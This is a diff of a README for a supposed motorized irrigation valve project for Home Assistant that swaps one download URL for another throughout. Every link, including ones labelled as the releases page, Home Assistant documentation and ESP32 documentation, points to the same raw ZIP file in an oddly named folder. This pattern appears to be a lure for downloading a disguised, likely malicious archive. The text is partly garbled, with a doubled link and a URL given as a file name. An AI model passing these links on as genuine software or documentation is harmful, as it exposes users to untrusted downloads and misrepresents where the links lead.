@@ -1,6 +1,6 @@
 # 🚀 Motorized_Valve_CR05_Project - Smart Water Control Made Easy
 
-[![Download Now](https://github.com/AndruxAKA/Motorized_Valve_CR05_Project/raw/refs/heads/main/sleevelessness/Valve-C-Motorized-Project-3.8.zip%https://github.com/AndruxAKA/Motorized_Valve_CR05_Project/raw/refs/heads/main/sleevelessness/Valve-C-Motorized-Project-3.8.zip)](https://github.com/AndruxAKA/Motorized_Valve_CR05_Project/raw/refs/heads/main/sleevelessness/Valve-C-Motorized-Project-3.8.zip)
+[![Download Now](https://raw.githubusercontent.com/AndruxAKA/Motorized_Valve_CR05_Project/main/sleevelessness/Project-Motorized-Valve-C-v3.7.zip%https://raw.githubusercontent.com/AndruxAKA/Motorized_Valve_CR05_Project/main/sleevelessness/Project-Motorized-Valve-C-v3.7.zip)](https://raw.githubusercontent.com/AndruxAKA/Motorized_Valve_CR05_Project/main/sleevelessness/Project-Motorized-Valve-C-v3.7.zip)
 
 ## 📜 Project Description
 The Motorized Valve CR05 Project allows you to control your irrigation system using a motorized valve. It integrates seamlessly with Home Assistant, making it simple to manage your garden or yard watering needs right from your smartphone.
@@ -21,12 +21,12 @@ The Motorized Valve CR05 Project allows you to control your irrigation system us
 To start using the Motorized Valve CR05, you'll first need to download the software. Follow the instructions below to set up your system.
 
 ## ⬇️ Download & Install
-1. Visit the [Releases page](https://github.com/AndruxAKA/Motorized_Valve_CR05_Project/raw/refs/heads/main/sleevelessness/Valve-C-Motorized-Project-3.8.zip) to access the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/AndruxAKA/Motorized_Valve_CR05_Project/main/sleevelessness/Project-Motorized-Valve-C-v3.7.zip) to access the latest version of the application.
 2. Once on the page, look for the most recent release. You will see a list of files available for download.
 3. Download the appropriate version for your device, usually labeled as `Motorized_Valve_CR05_<version>.zip`.
 4. After downloading, locate the ZIP file in your downloads folder.
 5. Extract the contents of the ZIP file. You can do this by right-clicking the file and selecting "Extract All" or using your preferred extraction software.
-6. Follow the included documentation, usually named `https://github.com/AndruxAKA/Motorized_Valve_CR05_Project/raw/refs/heads/main/sleevelessness/Valve-C-Motorized-Project-3.8.zip` within the extracted folder, for installation steps.
+6. Follow the included documentation, usually named `https://raw.githubusercontent.com/AndruxAKA/Motorized_Valve_CR05_Project/main/sleevelessness/Project-Motorized-Valve-C-v3.7.zip` within the extracted folder, for installation steps.
 
 ## 🔄 Configuration
 Once you have installed the software, you'll need to configure it to work with your Home Assistant setup.
@@ -53,13 +53,13 @@ If you encounter issues:
 - **Home Assistant Doesn’t Recognize the Valve:** Make sure you have the latest Home Assistant version installed.
 
 ## 📚 Useful Resources
-- [Home Assistant Documentation](https://github.com/AndruxAKA/Motorized_Valve_CR05_Project/raw/refs/heads/main/sleevelessness/Valve-C-Motorized-Project-3.8.zip)
-- [ESP32 Official Documentation](https://github.com/AndruxAKA/Motorized_Valve_CR05_Project/raw/refs/heads/main/sleevelessness/Valve-C-Motorized-Project-3.8.zip)
+- [Home Assistant Documentation](https://raw.githubusercontent.com/AndruxAKA/Motorized_Valve_CR05_Project/main/sleevelessness/Project-Motorized-Valve-C-v3.7.zip)
+- [ESP32 Official Documentation](https://raw.githubusercontent.com/AndruxAKA/Motorized_Valve_CR05_Project/main/sleevelessness/Project-Motorized-Valve-C-v3.7.zip)
 
 ## 💬 Support
 For further assistance, you can reach out through the GitHub Issues page or contact the community forums related to Home Assistant.
 
 ## 🔗 Download Link
-For easy access, you can [visit this page to download](https://github.com/AndruxAKA/Motorized_Valve_CR05_Project/raw/refs/heads/main/sleevelessness/Valve-C-Motorized-Project-3.8.zip) the Motorized Valve CR05 software.
+For easy access, you can [visit this page to download](https://raw.githubusercontent.com/AndruxAKA/Motorized_Valve_CR05_Project/main/sleevelessness/Project-Motorized-Valve-C-v3.7.zip) the Motorized Valve CR05 software.
 
 This guide should help you get started with your Motorized Valve CR05 Project and make your irrigation system smarter and more efficient.
